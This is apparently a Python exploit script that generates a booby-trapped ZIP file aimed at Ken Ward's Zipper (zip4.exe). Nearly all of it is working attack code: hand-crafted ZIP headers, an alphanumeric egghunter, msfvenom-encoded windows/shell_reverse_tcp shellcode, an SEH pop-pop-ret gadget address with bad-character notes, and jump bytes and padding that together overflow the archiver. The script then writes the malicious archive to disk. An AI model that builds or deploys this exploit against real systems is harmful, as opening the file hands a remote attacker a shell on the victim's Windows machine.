#!/usr/bin/python

ldf_header = ("\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00")

#central directory header
cdf_header = ("\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00\x24\x00\x00"
"\x00\x00\x00\x00\x00")

# end of central directory header
eofcdf_header = ("\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00"
"\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00")



#msfvenom -p generic/custom PAYLOADFILE=egghunter.bin -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows
egghunter_shellcode="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIsVk19Ziofow21BBJwr3hXMvNulGucjbT8o880wVPVPSDlKjZnOpu8jLo45hgio8gAA"

#badchars::0a,00,0d,5c,0f,14,15,2f,3a

print "[+] Building attack string..."
#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed BufferRegister=EDI -f python -v shellcode, 702 bytes

shellcode =  "w00tw00t"
shellcode += "\x89\xe1\xda\xc2\xd9\x71\xf4\x5d\x55\x59\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shellcode += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shellcode += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shellcode += "\x69\x6c\x59\x78\x6c\x42\x77\x70\x73\x30\x65\x50"
shellcode += "\x71\x70\x4d\x59\x48\x65\x55\x61\x4b\x70\x65\x34"
shellcode += "\x6e\x6b\x42\x70\x50\x30\x6c\x4b\x51\x42\x54\x4c"
shellcode += "\x4c\x4b\x43\x62\x37\x64\x6e\x6b\x33\x42\x66\x48"
shellcode += "\x64\x4f\x58\x37\x53\x7a\x67\x56\x46\x51\x49\x6f"
shellcode += "\x4e\x4c\x75\x6c\x43\x51\x31\x6c\x77\x72\x34\x6c"
shellcode += "\x77\x50\x6f\x31\x58\x4f\x34\x4d\x46\x61\x39\x57"
shellcode += "\x48\x62\x38\x72\x30\x52\x62\x77\x4e\x6b\x73\x62"
shellcode += "\x66\x70\x6e\x6b\x72\x6a\x47\x4c\x6c\x4b\x62\x6c"
shellcode += "\x64\x51\x33\x48\x58\x63\x77\x38\x77\x71\x68\x51"
shellcode += "\x36\x31\x6e\x6b\x51\x49\x45\x70\x33\x31\x49\x43"
shellcode += "\x4e\x6b\x73\x79\x34\x58\x6d\x33\x55\x6a\x63\x79"
shellcode += "\x4e\x6b\x77\x44\x6c\x4b\x55\x51\x38\x56\x30\x31"
shellcode += "\x79\x6f\x4c\x6c\x69\x51\x58\x4f\x54\x4d\x35\x51"
shellcode += "\x4a\x67\x50\x38\x4b\x50\x74\x35\x4b\x46\x47\x73"
shellcode += "\x33\x4d\x79\x68\x45\x6b\x43\x4d\x51\x34\x63\x45"
shellcode += "\x38\x64\x50\x58\x4e\x6b\x73\x68\x36\x44\x66\x61"
shellcode += "\x58\x53\x33\x56\x6e\x6b\x64\x4c\x30\x4b\x6e\x6b"
shellcode += "\x50\x58\x37\x6c\x45\x51\x39\x43\x4e\x6b\x35\x54"
shellcode += "\x6c\x4b\x37\x71\x7a\x70\x6f\x79\x52\x64\x74\x64"
shellcode += "\x71\x34\x43\x6b\x51\x4b\x55\x31\x32\x79\x63\x6a"
shellcode += "\x52\x71\x39\x6f\x6d\x30\x51\x4f\x71\x4f\x32\x7a"
shellcode += "\x6c\x4b\x76\x72\x48\x6b\x6e\x6d\x71\x4d\x50\x68"
shellcode += "\x65\x63\x64\x72\x37\x70\x47\x70\x75\x38\x43\x47"
shellcode += "\x42\x53\x36\x52\x73\x6f\x50\x54\x53\x58\x50\x4c"
shellcode += "\x50\x77\x77\x56\x37\x77\x49\x6f\x58\x55\x6f\x48"
shellcode += "\x6c\x50\x57\x71\x75\x50\x37\x70\x55\x79\x59\x54"
shellcode += "\x31\x44\x66\x30\x72\x48\x47\x59\x4d\x50\x52\x4b"
shellcode += "\x53\x30\x49\x6f\x49\x45\x56\x30\x70\x50\x52\x70"
shellcode += "\x46\x30\x61\x50\x50\x50\x43\x70\x46\x30\x51\x78"
shellcode += "\x68\x6a\x74\x4f\x49\x4f\x59\x70\x59\x6f\x78\x55"
shellcode += "\x7a\x37\x42\x4a\x44\x45\x62\x48\x59\x50\x79\x38"
shellcode += "\x43\x30\x50\x6c\x32\x48\x66\x62\x55\x50\x45\x51"
shellcode += "\x6f\x4b\x4b\x39\x39\x76\x33\x5a\x52\x30\x52\x76"
shellcode += "\x53\x67\x30\x68\x5a\x39\x59\x35\x52\x54\x45\x31"
shellcode += "\x6b\x4f\x48\x55\x4f\x75\x69\x50\x61\x64\x64\x4c"
shellcode += "\x6b\x4f\x32\x6e\x66\x68\x62\x55\x5a\x4c\x32\x48"
shellcode += "\x6a\x50\x48\x35\x6d\x72\x50\x56\x6b\x4f\x79\x45"
shellcode += "\x32\x48\x51\x73\x42\x4d\x32\x44\x43\x30\x4b\x39"
shellcode += "\x6a\x43\x62\x77\x51\x47\x63\x67\x74\x71\x4a\x56"
shellcode += "\x63\x5a\x76\x72\x43\x69\x76\x36\x58\x62\x6b\x4d"
shellcode += "\x53\x56\x38\x47\x63\x74\x37\x54\x77\x4c\x46\x61"
shellcode += "\x76\x61\x6c\x4d\x61\x54\x45\x74\x52\x30\x7a\x66"
shellcode += "\x55\x50\x51\x54\x31\x44\x70\x50\x70\x56\x32\x76"
shellcode += "\x33\x66\x57\x36\x50\x56\x70\x4e\x30\x56\x71\x46"
shellcode += "\x63\x63\x46\x36\x75\x38\x71\x69\x38\x4c\x77\x4f"
shellcode += "\x6e\x66\x69\x6f\x6e\x35\x4e\x69\x4b\x50\x42\x6e"
shellcode += "\x32\x76\x51\x56\x59\x6f\x44\x70\x33\x58\x53\x38"
shellcode += "\x6d\x57\x55\x4d\x35\x30\x39\x6f\x48\x55\x4d\x6b"
shellcode += "\x4a\x50\x6f\x45\x6c\x62\x51\x46\x75\x38\x49\x36"
shellcode += "\x6e\x75\x6f\x4d\x6d\x4d\x59\x6f\x4b\x65\x45\x6c"
shellcode += "\x77\x76\x53\x4c\x75\x5a\x4f\x70\x59\x6b\x39\x70"
shellcode += "\x32\x55\x56\x65\x4d\x6b\x51\x57\x77\x63\x74\x32"
shellcode += "\x72\x4f\x70\x6a\x57\x70\x50\x53\x79\x6f\x4b\x65"
shellcode += "\x41\x41"





#Address=00433B3B Message=  0x00433b3b : pop ecx # pop ebp # ret 0x04 | startnull,asciiprint,ascii {PAGE_EXECUTE_READ}[zip4.exe] ASLR:False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Ken Ward's Zipper\zip4.exe)

total_length=4064

exploit = "E"*10 
exploit +=egghunter_shellcode #117
exploit +="A"*840

#!mona encode -t alphanum -s '\xB0\xF4\x12\x00'

exploit +="\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x58\x4e\x55\x2d\x70\x58\x4e\x55\x2d\x70\x5a\x50\x55"
exploit +="\x98\x85"
exploit += "A"*(1022-len(exploit)) #255

#JNZ $-55
#JZ $-55
exploit +="\x75\x80\x74\x80"+"\x3b\x3b\x43\x00"
#not required since buffer is large
exploit+=shellcode
exploit+= "D"*(4064-len(exploit))+".bin"

print "Total Lenghth::"+ str(len(exploit))

print "[+] Writing payload to cst-kenzip.zip"
# write the payload
mefile = open('cst-kenzip.zip','w');
mefile.write(ldf_header + exploit + cdf_header + exploit + eofcdf_header);
mefile.close()
print "[+] Exploit file created!!"
            

#we need to long jump to encoded shellcode 